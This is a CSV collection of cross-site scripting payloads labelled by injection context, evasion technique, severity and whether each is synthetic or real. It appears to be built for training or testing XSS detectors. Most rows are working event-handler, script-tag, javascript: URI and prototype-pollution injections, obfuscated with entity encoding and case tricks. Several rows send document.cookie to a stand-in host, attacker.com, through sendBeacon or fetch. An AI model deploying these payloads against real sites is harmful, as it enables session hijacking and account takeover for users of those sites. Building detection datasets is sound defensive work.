payload,context,technique,severity,length,source
"'><img src=x onwaiting=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,61,synthetic
%3C!--%3E%3Canimatemotion onsecuritypolicyviolation=console.log('XSS')%3E,tag_injection,synthetic,medium,73,synthetic
`%3E%3Cimg src=x onpause=console.log('XSS')%3E,attribute_escape,synthetic,medium,46,synthetic
onplaying=prompt/*x*/(document.domain),event_handler,synthetic,low,38,synthetic
__proto__[%22onend%22]=prompt(document.domain),dom_sink,synthetic,medium,46,synthetic
%3Cselect x=y onvolumechange=console.log(1)%3E,tag_injection,synthetic,medium,46,synthetic
"j&#97;v&#97;
script:consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))",js_uri,synthetic,low,76,synthetic
""" onpoint&#101;rmov&#101;=prompt('XSS') """,attribute_escape,synthetic,medium,41,synthetic
%27><img src=x onerror=alert(1)>,attribute_escape,synthetic,medium,32,synthetic
&quot; ondr&#97;gst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in) x=&quot;,attribute_escape,synthetic,low,78,synthetic
""" ><svg ondragenter=confirm('XSS')>",attribute_escape,synthetic,medium,35,synthetic
"%27 onanimationcancel=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,high,68,synthetic
<dt onpointerup=alert(1) style=display:block>AnonKryptiQuz</dt>,tag_injection,none,medium,63,real
"\"" onmousewheel=\u0061lert(1)//",attribute_escape,synthetic,low,31,synthetic
' ><svg onbegin=confirm(1)>,attribute_escape,synthetic,medium,27,synthetic
\' onpointerdown=alert(document.domain)//,attribute_escape,synthetic,medium,41,synthetic
"on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log&#40;String.fromCh&#97;rCod&#101;(88,83,83)&#41;",event_handler,synthetic,low,102,synthetic
%22 ><svg ontouchmove=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
&quOt; onAuxCliCk=AleRt(1) X=&QuoT;,attribute_escape,synthetic,medium,35,synthetic
%3Cselect src=x onmousewheel=alert(document.domain)%3E,tag_injection,synthetic,medium,54,synthetic
"	onKeyDowN=pRomPt(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,48,synthetic
__proto__[%22oncanplay%22]=alert(document.cookie+%27&loc=%27+location.href),dom_sink,synthetic,high,75,synthetic
"<style oncut=""alert(1)"" contenteditable>AnonKryptiQuz</style>",tag_injection,none,medium,61,real
"`><Img srC=x onResEt=AleRt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,58,synthetic
"<link draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</link>",tag_injection,none,medium,66,real
onauxclick=prompt&#40;1&#41;,event_handler,synthetic,low,28,synthetic
OndRop=coNsoLe.Log(doCumEnt.doMaiN),event_handler,synthetic,medium,35,synthetic
"setInterval(%22eval(1)%22,100)",dom_sink,synthetic,high,30,synthetic
""" ontransitionend=confirm('XSS') """,attribute_escape,synthetic,medium,34,synthetic
<script>Function(%27alert(%27XSS%27)%27)();</script>,script_injection,synthetic,medium,52,synthetic
\%27 onpagehide=confirm(1)//,attribute_escape,synthetic,medium,28,synthetic
"document.querySelector(""body"").innerHTML+=""confirm(document.cookie+'&loc='+location.href)""",dom_sink,synthetic,high,90,synthetic
' %3E%3Csvg onselect=confirm(location.hash)%3E,attribute_escape,synthetic,medium,46,synthetic
<svg onpointermove=alert(1) style=display:block>AnonKryptiQuz</svg>,tag_injection,none,medium,67,real
"Obj&#101;ct.&#97;ssign(window,{""on&#101;rror"":f&#101;tch})",dom_sink,synthetic,low,58,synthetic
"LocAtiOn.HreF=""JavAscRipT:eVal(naVigAtoR.sEndBeaCon('//atTacKer.coM',DocUmeNt.CooKie))""",dom_sink,synthetic,high,87,synthetic
<meta src=x ondrop=alert(document.domain)>,tag_injection,synthetic,medium,42,synthetic
"<maTh
OnmOusEup=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,45,synthetic
' ><svg onerror=console.log(location.hash)>,attribute_escape,synthetic,medium,43,synthetic
\' OnbEfoRepAstE=cOnfIrm(doCumEnt.doMaiN)//,attribute_escape,synthetic,medium,43,synthetic
&quot; onwh&#101;&#101;l=prompt('XSS') x=&quot;,attribute_escape,synthetic,medium,47,synthetic
OncLicK=pRomPt&#40;'XSS'&#41;,event_handler,synthetic,low,29,synthetic
<&#97;nim&#97;t&#101;tr&#97;nsform	onpoint&#101;rdown=prompt(1)>,tag_injection,synthetic,medium,64,synthetic
onscrollsn&#97;pch&#97;ng&#101;=confirm&#40;'XSS'&#41;,event_handler,synthetic,low,54,synthetic
<dialog contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,60,real
<a onbeforematch=prompt(document.domain)>,tag_injection,synthetic,medium,41,synthetic
<font onpointerenter=alert(1) style=display:block>AnonKryptiQuz</font>,tag_injection,none,medium,70,real
onhashchange=\u0061lert(location.hash),event_handler,synthetic,low,38,synthetic
"' ><svg onp&#97;us&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape,synthetic,low,82,synthetic
"setInterval(""\u0061lert(String.fromCharCode(88,83,83))"",100)",dom_sink,synthetic,high,60,synthetic
http://example.com/?%0aalert(23),generic,url_encoding,medium,32,real
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,67,real
<input onblur=write(AnonKryptiQuz) autofocus><input autofocus>,tag_injection,none,low,62,real
"<rp onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</rp>",tag_injection,none,medium,61,real
"%27 ><svg ontransitionstart=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,67,synthetic
"window[""eval""](document.cookie)",dom_sink,synthetic,high,31,synthetic
ong&#101;stur&#101;st&#97;rt=consol&#101;.log/***/(loc&#97;tion.h&#97;sh),event_handler,synthetic,low,73,synthetic
"<svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",attribute_escape,none,low,55,real
onmous&#101;down=j&#97;v&#97;script:&#97;l&#101;rt(1),event_handler,synthetic,low,53,synthetic
"(n&#101;w Function(""&#101;v&#97;l(docum&#101;nt.dom&#97;in)""))();",dom_sink,synthetic,low,65,synthetic
"<style>:target {transform: rotate(180deg);}</style><head id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></head>",tag_injection,none,medium,126,real
""" oNcuT=cOnsOle.loG(1) """,attribute_escape,synthetic,medium,24,synthetic
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""consol&#101;.log('//&#97;tt&#97;ck&#101;r.com/?c='+docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,low,146,synthetic
%22><mtext onstalled=console.log(document.domain)>,tag_injection,synthetic,medium,50,synthetic
"<object draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</object>",tag_injection,none,medium,68,real
"<strike onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</strike>",tag_injection,none,medium,67,real
"<code oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</code>",tag_injection,none,medium,60,real
"<IMG SRC=x onmousedown=""alert(String.fromCharCode(88,83,83))"">",tag_injection,encoding|case_variation,high,62,real
onc&#97;npl&#97;y=confirm/*x*/(1),event_handler,synthetic,low,33,synthetic
onb&#101;gin=consol&#101;.log/*x*/('XSS'),event_handler,synthetic,low,41,synthetic
""" onscrollsnapchange=alert(1) """,attribute_escape,synthetic,medium,31,synthetic
"""><Img srC=x onScrOllSnaPchAngE=pRomPt(StrIng.frOmCHarCodE(88,83,83))>",attribute_escape,synthetic,high,70,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></div>",tag_injection,none,medium,176,real
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,dom_sink,none,medium,236,real
&#60;body onload=alert('AnonKryptiQuz')&#62;&#34;&#34;,event_handler,html_entity,medium,54,real
"<element oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</element>",tag_injection,none,medium,77,real
'><img src=x onclose=alert(document.domain)>,attribute_escape,synthetic,medium,44,synthetic
?path=%2500%27onmouseover=%27window.stop();alert(document.domain)%27,dom_sink,url_encoding,medium,68,real
"' oNclOse=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape,synthetic,high,49,synthetic
"OncLicK=jAvaScrIpt:coNfiRm(StrIng.frOmCHarCodE(88,83,83))",event_handler,synthetic,high,57,synthetic
"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable style=display:block>drop here</pre>",tag_injection,none,medium,123,real
<details onpointerup=alert(1) style=display:block>AnonKryptiQuz</details>,tag_injection,none,medium,73,real
'); alert('xss'); var x=',attribute_escape,none,medium,25,real
"<hr oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,96,real
OnrEpeAt=AleRt/***/('XSS'),event_handler,synthetic,low,26,synthetic
%27><img src=x onwebkitfullscreenchange=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,58,synthetic
""" onpopstate=alert(1) """,attribute_escape,synthetic,medium,23,synthetic
' onerror=alert(document.domain) ',attribute_escape,synthetic,medium,34,synthetic
d1bvs</script><script>alert(`AnonKryptiQuz`)</script>c579g,script_injection,none,medium,58,real
<marquee/onstart=alert()>,tag_injection,none,medium,25,real
"__proto__[""onch&#97;ng&#101;""]=&#101;v&#97;l(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))",dom_sink,synthetic,low,145,synthetic
"""><img src=x onauxclick=prompt(location.hash)>",attribute_escape,synthetic,medium,46,synthetic
${confirm?new()('document.domain')},template_injection,synthetic,low,35,synthetic
"<set oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,97,real
"""%3E%3Cimg src=x ontransitionrun=console.log('XSS')%3E",attribute_escape,synthetic,medium,54,synthetic
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=console.log(String.fromCharCode(88,83,83)) )//%0D%0A%0d%0a",js_uri,synthetic,high,103,synthetic
' %3E%3Csvg onpaste=console.log(1)%3E,attribute_escape,synthetic,medium,37,synthetic
<noscr	ipt x=y onpointerdown=prompt(document.domain)>,tag_injection,synthetic,medium,53,synthetic
"<head onmouseout=""alert(1)"">AnonKryptiQuz</head>",tag_injection,none,medium,48,real
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></ins>",tag_injection,none,medium,166,real
"loc&#97;tion=""j&#97;v&#97;script:f&#101;tch(docum&#101;nt.dom&#97;in)""",dom_sink,synthetic,low,70,synthetic
"""'`><p><svg><script>a='hello\x27;javascript:alert(0017)//';</script></p>",script_injection,none,medium,72,real
' onbegin=confirm(location.hash) ',attribute_escape,synthetic,medium,34,synthetic
' ><svg onvolumechange=\u0061lert('XSS')>,attribute_escape,synthetic,low,41,synthetic
%27><img src=x onsecuritypolicyviolation=prompt(1)>,attribute_escape,synthetic,medium,51,synthetic
"<BR SIZE=""&{javascript:alert(2447)}"">",js_uri,case_variation,medium,37,real
"&#101;v&#97;l(""confirm(1)"")",dom_sink,synthetic,medium,27,synthetic
"setTimeout(%22fetch(%27//attacker.com/?c=%27+document.cookie)%22,0)",dom_sink,synthetic,high,67,synthetic
onbegin=javascript:console.log(%27XSS%27),event_handler,synthetic,medium,41,synthetic
%22><animate onwebkitfullscreenchange=console.log(1)>,tag_injection,synthetic,medium,53,synthetic
onmozfullscr&#101;&#101;nch&#97;ng&#101;=j&#97;v&#97;script:consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,102,synthetic
%3Ctr/onanimationend=prompt('XSS')%3E,tag_injection,synthetic,medium,37,synthetic
"<area oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</area>",tag_injection,none,medium,71,real
"<style>@keyframes x{}</style><spacer style=""animation-name:x"" onanimationstart=""alert(1)""></spacer>",tag_injection,none,medium,99,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",tag_injection,none,medium,184,real
"<area onended=prompt(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,52,synthetic
"OntOggLe=ConFirM(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,47,synthetic
<td/onwebkitanimationend=prompt(%27XSS%27)>,tag_injection,synthetic,medium,43,synthetic
"JAVASCRIPT:prompt(String.fromCharCode(88,83,83))",js_uri,synthetic,high,48,synthetic
`><img src=x onb&#101;for&#101;cut=confirm(1)>,attribute_escape,synthetic,medium,46,synthetic
\' ontouchmov&#101;=consol&#101;.log('XSS')//,attribute_escape,synthetic,low,45,synthetic
%27 ><svg onscrollsnapchange=console.log(1)>,attribute_escape,synthetic,medium,44,synthetic
""" %3E%3Csvg onbegin=console.log(location.hash)%3E",attribute_escape,synthetic,medium,49,synthetic
' ondragenter=prompt(document.domain) ',attribute_escape,synthetic,medium,39,synthetic
"<a href=""#"" id=""uniqueLink"">Click me</a> <script> (function() { var a = ['\x6F\x70\x65\x6E', '\x77\x72\x69\x74\x65', '\x63\x6C\x6F\x73\x65', '\x70\x72\x69\x6E\x74', '\x61\x6C\x65\x72\x74']; var b = ['@', 'h', 'x', 'l', 'x', 'm', 'j']; var c = ['B', '1', 'P', '4', '$', '$']; document.getElementById('uniqueLink').onclick = function() { var w = window[a[0]](); w.document[a[1]](b.join('')); w.document[a[2]](); w[a[3]](); window[a[4]](c.join('')); }; })(); </script>",dom_sink,none,low,465,real
\' onpagereveal=\u0061lert(location.hash)//,attribute_escape,synthetic,low,43,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(1)"")",dom_sink,synthetic,medium,68,synthetic
"__proto__[""ondrop""]=console.log(navigator.sendBeacon('//attacker.com',document.cookie))",dom_sink,synthetic,high,87,synthetic
' %3E%3Csvg ondblclick=confirm(1)%3E,attribute_escape,synthetic,medium,36,synthetic
"<script>window['&#97;l&#101;rt'](String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection,synthetic,low,81,synthetic
""" onmous&#101;down=confirm(1) """,attribute_escape,synthetic,medium,31,synthetic
"' onpageswap=console.log(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,high,57,synthetic
"<caption draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",tag_injection,none,medium,92,real
"<col draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</col>",tag_injection,none,medium,64,real
OnaUxcLicK=pRomPt(1),event_handler,synthetic,medium,20,synthetic
<nobr id=x tabindex=1 onactivate=alert(1)></nobr>,tag_injection,none,medium,49,real
%3Cset	onclose=confirm(document.domain)%3E,tag_injection,synthetic,medium,42,synthetic
"loc&#97;tion=""j&#97;v&#97;script:XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;)""",dom_sink,synthetic,high,85,synthetic
%22><math ondragover=prompt(1)>,tag_injection,synthetic,medium,31,synthetic
<optgroup onpointermove=alert(1) style=display:block>AnonKryptiQuz</optgroup>,tag_injection,none,medium,77,real
&quOt; onFocUs=AleRt(1) X=&QuoT;,attribute_escape,synthetic,medium,32,synthetic
"<legend onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",tag_injection,none,medium,74,real
"<! foo=""><script>javascript:alert(4032)</script>"">",script_injection,none,medium,50,real
' oNweBkiTtrAnsItiOneNd=ConFirM(lOcaTioN.hAsh) ',attribute_escape,synthetic,medium,48,synthetic
"<svg draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</svg>",tag_injection,none,medium,82,real
' onscrollsn&#97;pch&#97;ng&#101;=consol&#101;.log(1) ',attribute_escape,synthetic,low,55,synthetic
<t&#97;bl&#101;	oncopy=confirm('XSS')>,tag_injection,synthetic,medium,38,synthetic
%3CSCRIPT%3Eprompt(location.hash)%3C/SCRIPT%3E,script_injection,synthetic,medium,46,synthetic
' %3E%3Csvg ontouchend=confirm('XSS')%3E,attribute_escape,synthetic,medium,40,synthetic
<baSe X=y onBefOreCopY=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection,synthetic,medium,50,synthetic
<svg/onpromptdismiss=alert(location.hash)>,tag_injection,synthetic,medium,42,synthetic
"element.setAttribute(""onclick"",""confirm(document.cookie+'&loc='+location.href)"")",dom_sink,synthetic,high,80,synthetic
 onwh&#101;&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,61,synthetic
<IMG SRC=&{javascript:alert(1);};>,js_uri,case_variation,medium,34,real
"\"" OneRroR=aLerT(dOcuMenT.dOmaIn)//",attribute_escape,synthetic,medium,35,synthetic
"<noscript onbeforematch=confirm(String.fromCharCode(88,83,83)) onbeforematch=confirm(String.fromCharCode(88,83,83))>",tag_injection,synthetic,high,116,synthetic
""" ><svG oNmoUseUp=ConSolE.lOg('XSS')>",attribute_escape,synthetic,medium,37,synthetic
"""><noscript onb&#101;for&#101;m&#97;tch=consol&#101;.log('XSS')>",tag_injection,synthetic,low,64,synthetic
' ><svg onmousewheel=console.log(1)>,attribute_escape,synthetic,medium,36,synthetic
"<style>@keyframes x{}</style><picture style=""animation-name:x"" onwebkitanimationend=""alert(1)""></picture>",tag_injection,none,medium,105,real
"""%3E%3Cimg src=x onfocus=alert(1)%3E",attribute_escape,synthetic,medium,36,synthetic
"<b onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</b>",tag_injection,none,medium,59,real
"<div draggable=""true"" contenteditable>drag me</div><object ondragover=alert(1) contenteditable>drop here</object>",tag_injection,none,medium,113,real
<liNk	OniNpuT=aLerT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,37,synthetic
"<div
onp&#97;us&#101;=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,53,synthetic
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,tag_injection,none,medium,69,real
	onTouChmOve=prOmpT(dOcuMenT.dOmaIn),event_handler,synthetic,medium,36,synthetic
\' onsearch=confirm(1)//,attribute_escape,synthetic,medium,24,synthetic
<multicol onpointerleave=alert(1) style=display:block>AnonKryptiQuz</multicol>,tag_injection,none,medium,78,real
'><Img srC=x onAuxCliCk=ConSolE.lOg(1)>,attribute_escape,synthetic,medium,39,synthetic
<&#97;udio x=y oninput=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,53,synthetic
"<style>@keyframes slidein {}</style><textarea style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></textarea>",tag_injection,none,medium,170,real
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onwebkitanimationend=""alert(1)""></thead>",tag_injection,none,medium,101,real
"<command onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</command>",tag_injection,none,medium,67,real
"Obj&#101;ct.&#97;ssign(window,{""onmous&#101;wh&#101;&#101;l"":confirm})",dom_sink,synthetic,low,70,synthetic
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,tag_injection,none,medium,46,real
